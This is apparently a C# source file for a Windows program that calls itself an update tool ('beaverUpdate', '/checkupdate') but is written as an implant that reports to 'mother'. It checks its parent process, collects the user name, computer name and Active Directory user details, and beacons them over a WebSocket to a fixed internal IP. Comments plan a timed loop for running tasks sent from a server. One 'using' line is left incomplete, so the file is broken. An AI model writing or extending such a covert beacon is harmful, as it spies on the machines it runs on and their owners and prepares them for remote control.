using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;
using System.Diagnostics;
using System.Management;
using

using BeaverUpdate;

namespace beaverUpdate
{
    internal class Program
    {
        static int timerail = 10;

        static async Task Main(string[] args)
        {
            // protected start: one instance, specific parents
            if (!Utilities.protectedStart())
            {
                Console.WriteLine("Unable to run due to security measures.");
                return;
            }

            // Ensure we're tracking state
            var db = new DatabaseManager("syncstate.db");

            // Say hello to mother. 
            Console.WriteLine("Hello mother!");
            Utilities.HostInfo hostInfo = Utilities.GetHostInfo();

            try
            {
                AD.UserInfo userInfo = AD.GetUserInfo();
                Console.WriteLine($"UserInfo: {userInfo.Name}");
            } catch
            {
                Console.WriteLine("Not AD joined.");
            }
            

            Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
            await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");

            // Start working through pending tasks on a timer, in a thread
            // :memsql: - lastTask(#), lastRun(time)
            // have numbered list of tasks, iterate in loop only start next # if it's been 20 minutes since last run
            // look for server messages between?

        }

        // supplementary
        

        static async Task SendMessage(string clientName, string message)
        {
            using (ClientWebSocket webSocket = new ClientWebSocket())
            {

                Uri serverUri = new Uri($"ws://192.168.1.202/checkupdate?client={clientName}");
                try
                {
                    await webSocket.ConnectAsync(serverUri, CancellationToken.None);
                    Console.WriteLine("Connected to WebSocket server.");

                    // Create the JSON payload for the "update" event
                    string jsonPayload = $"{{\"event\": \"message\", \"message\": \"{message}\"}}";
                    byte[] sendBuffer = Encoding.UTF8.GetBytes(jsonPayload);

                    // Send the message to the WebSocket server
                    await webSocket.SendAsync(new ArraySegment<byte>(sendBuffer), WebSocketMessageType.Text, true, CancellationToken.None);
                    Console.WriteLine("Sent 'message' event with message 'check-in'.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
    }    
}
